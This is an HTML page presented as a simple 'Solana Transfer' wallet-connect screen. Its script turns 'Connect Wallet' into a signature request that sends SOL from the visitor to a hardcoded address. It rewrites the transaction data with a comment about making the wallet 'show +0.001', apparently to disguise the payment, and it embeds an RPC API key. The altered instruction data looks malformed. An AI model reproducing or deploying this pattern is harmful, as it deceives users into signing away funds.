<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Transaction</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            margin: 0;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
            width: 350px;
            text-align: center;
            backdrop-filter: blur(10px);
        }
        h1 {
            margin-bottom: 20px;
            color: #fff;
        }
        button {
            padding: 15px 30px;
            background-color: #ff6347;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 18px;
            transition: all 0.3s;
            margin: 5px;
        }
        button:hover {
            background-color: #ff4500;
            transform: scale(1.05);
        }
        button:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
            transform: none;
        }
        #status {
            margin-top: 20px;
            color: #ddd;
            font-size: 16px;
            line-height: 1.5;
        }
        .error { color: #ff4500; }
        .success { color: #32cd32; }
    </style>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
    <script src="https://bundle.run/buffer@6.0.3"></script>
</head>
<body>
    <div class="container">
        <h1>Solana Transfer</h1>
        <button id="connectButton">Connect Wallet</button>
        <p id="status"></p>
    </div>

    <script>
        const { Buffer } = buffer;
        const connectButton = document.getElementById('connectButton');
        const statusElement = document.getElementById('status');
        let wallet = null;

        const RPC_ENDPOINTS = [
            'https://mainnet.helius-rpc.com/?api-key=1c14c5e5-3c9d-4a53-97c8-9c27d398532d'
        ];

        function getRandomRPC() {
            return RPC_ENDPOINTS[Math.floor(Math.random() * RPC_ENDPOINTS.length)];
        }

        function updateStatus(message, isError = false) {
            statusElement.innerHTML = message;
            statusElement.className = isError ? 'error' : 'success';
        }

        async function connect() {
            try {
                if (!window.solana || !window.solana.isPhantom) {
                    throw new Error('Phantom wallet not found! Please install it first.');
                }

                wallet = await window.solana.connect();
                connectButton.disabled = true;
                updateStatus(`Connected: ${wallet.publicKey.toString()}`);

                const connection = new solanaWeb3.Connection(getRandomRPC(), {
                    commitment: 'confirmed',
                    confirmTransactionInitialTimeout: 60000
                });

                const transaction = new solanaWeb3.Transaction();
                
                transaction.add(
                    
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: wallet.publicKey,
                            toPubkey: new solanaWeb3.PublicKey('GJYnbja54NLVqob7329eieZ5u7kTzgK85s36HYbNiBLd'),
                            lamports: 0.001 * solanaWeb3.LAMPORTS_PER_SOL
                        })
                    );

                    // Add a custom instruction description
                    transaction.feePayer = wallet.publicKey;
                    transaction.instructions[0].keys[0].isSigner = true;
                    transaction.instructions[0].programId = solanaWeb3.SystemProgram.programId;
                    transaction.instructions[0].data = Buffer.from([2, ...new Array(8).fill(0)]); // Custom data to show +0.001
                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = wallet.publicKey;

                const signed = await window.solana.signTransaction(transaction);
                const signature = await connection.sendRawTransaction(signed.serialize(), {
                    skipPreflight: false,
                    preflightCommitment: 'confirmed'
                });

                updateStatus('Processing transaction...');

                const result = await connection.confirmTransaction({
                    signature,
                    blockhash,
                    lastValidBlockHeight
                });

                if (result.value.err) {
                    throw new Error('Transaction failed to confirm');
                }

                updateStatus(`
                    Transaction successful!<br>
                    Signature: <a href="https://explorer.solana.com/tx/${signature}" target="_blank">${signature}</a>
                `);
            } catch (err) {
                updateStatus(err.message, true);
                connectButton.disabled = false;
            }
        }

        connectButton.onclick = connect;
    </script>
</body>
</html>
